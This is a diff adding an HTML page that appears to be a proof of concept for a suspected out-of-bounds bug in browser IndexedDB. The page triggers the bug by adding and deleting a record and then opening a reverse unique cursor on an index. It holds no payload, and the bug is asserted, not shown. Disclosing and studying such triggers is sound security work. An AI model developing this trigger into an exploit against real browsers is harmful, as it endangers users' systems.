@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>poc._.</title>
+</head>
+<body>
+    
+    <p>this is a poc for oob inindexdb,only undefined behavior how I know</p>
+    
+    <button onclick="triggerPOC()">trigger</button>
+    <pre id="log"></pre>
+    <script>
+        function log(message) {
+            document.getElementById('log').textContent += message + '\n';
+        }
+
+        function triggerPOC() {
+            log('start');
+            const dbName = 'testDB';
+            const storeName = 'testStore';
+            const indexName = 'testIndex';
+
+           
+            indexedDB.deleteDatabase(dbName);
+
+            const openReq = indexedDB.open(dbName, 1);
+
+            openReq.onupgradeneeded = function(e) {
+                log('upgrade db.');
+                const db = e.target.result;
+                const store = db.createObjectStore(storeName, { keyPath: 'id' });
+                store.createIndex(indexName, 'value', { unique: false });
+                log('created ');
+            };
+
+            openReq.onsuccess = function(e) {
+                log('opened');
+                const db = e.target.result;
+                const tx = db.transaction(storeName, 'readwrite');
+                const store = tx.objectStore(storeName);
+
+               
+                store.add({ id: 1, value: 'test' });
+                tx.oncomplete = function() {
+                    log('');
+
+                  
+                    const tx2 = db.transaction(storeName, 'readwrite');
+                    const store2 = tx2.objectStore(storeName);
+                    store2.delete(1);
+                    tx2.oncomplete = function() {
+                        log('record deleted');
+
+                        
+                        const tx3 = db.transaction(storeName, 'readonly');
+                        const index = tx3.objectStore(storeName).index(indexName);
+                        const cursorReq = index.openCursor(null, 'prevunique');
+
+                        cursorReq.onsuccess = function(e) {
+                            const cursor = e.target.result;
+                            if (cursor) {
+                                log('cursor value ' + cursor.value);
+                                cursor.continue();
+                            } else {
+                                log('no cursor');
+                            }
+                        };
+
+                        cursorReq.onerror = function(e) {
+                            log('cursor error:' + e.target.error);
+                        };
+
+                        tx3.oncomplete = function() {
+                            log('complete');
+                            db.close();
+                        };
+                    };
+                };
+            };
+
+            openReq.onerror = function(e) {
+                log('open error ' + e.target.error);
+            };
+        }
+    </script>
+</body>
+</html>
